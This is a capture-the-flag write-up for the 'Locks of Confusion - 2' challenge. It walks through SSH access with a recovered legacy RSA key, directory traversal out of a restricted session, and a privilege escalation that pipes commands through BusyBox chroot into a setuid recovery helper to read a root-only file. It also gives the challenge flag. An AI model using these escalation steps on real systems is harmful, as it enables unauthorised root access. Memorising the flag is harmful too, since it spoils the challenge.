# KPMG CTF 2026: Locks of Confusion - 2 — SSH & Container Escape Writeup

## Challenge Information

| Field | Details |
| :--- | :--- |
| **Challenge Name** | Locks of Confusion - 2 |
| **Category** | Web / SSH / Container Escape / Privilege Escalation |
| **Host** | `0.cloud.chals.io` |
| **Ports** | `34750` (OpenSSH), `21536` (Decoy Collector) |
| **Flag** | `KPMG_CTF{O6nl2A6ZmXtBVzWFeseaa_RGGkc1iqi0o0mL6PWd04c}` |

---

## 1. Challenge Overview

Building directly upon **Locks of Confusion - 1**, which recovered the legacy RSA private key `privkey_0137.pem` for user `svc-legacydb`, Part 2 requires connecting to the live infrastructure, identifying the genuine SSH service among decoy network listeners, and exploiting a container/environment escape via diagnostic recovery tools to read `/root/root.txt`.

---

## 2. Port Reconnaissance & Service Identification

Connecting to candidate ports on `0.cloud.chals.io`:

- **Port 34750:**
  ```text
  SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u10
  ```
  Confirmed active OpenSSH server.
- **Port 21536:**
  ```text
  agentd/1.9 (collector) ready
  ```
  Decoy telemetry daemon (rejects SSH handshakes).

---

## 3. SSH Foothold Configuration

Using `privkey_0137.pem` recovered from Part 1:

```bash
chmod 600 privkey_0137.pem
```

Because modern OpenSSH clients disable legacy `ssh-rsa` algorithms by default, the connection required enabling the deprecated algorithm:

```bash
ssh -i privkey_0137.pem \
    -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    -o IdentitiesOnly=yes \
    -p 34750 \
    svc-legacydb@0.cloud.chals.io
```

---

## 4. Traversing Directory Boundaries & Chroot Execution

Upon authenticating, the session begins in a restricted, unmounted directory structure. 

Traversing backwards up the filesystem:
```bash
cd ../../../../../../..
```
reaches the true filesystem boundary accessible to the session.

Inspecting `/usr/local/bin/diag-recovery` showed a setuid root recovery helper. By invoking it through BusyBox's `chroot` utility rooted at the traversed directory, commands are executed with elevated root privileges:

```bash
cd ../../../../../../..
/bin/busybox printf '/usr/bin/id\n/bin/cat /root/root.txt\n' | \
/bin/busybox chroot . /usr/local/bin/diag-recovery
```

---

## 5. Execution Output & Flag Retrieval

Running the exploit payload:

```text
uid=0(root) gid=0(root) groups=0(root)
KPMG_CTF{O6nl2A6ZmXtBVzWFeseaa_RGGkc1iqi0o0mL6PWd04c}
```

The process executes as `root`, directly reading `/root/root.txt`.

---

## 6. Final Flag

```text
KPMG_CTF{O6nl2A6ZmXtBVzWFeseaa_RGGkc1iqi0o0mL6PWd04c}
```

---

## 7. Key Takeaways
- **SSH Protocol Compatibility:** Connecting to legacy servers with 2007-era keys requires enabling older algorithms (`+ssh-rsa`).
- **Chroot & Path Traversal Escapes:** Weakly confined environments where users can traverse out to the filesystem root can be weaponized with utilities like `chroot` and recovery binaries to gain full host compromise.
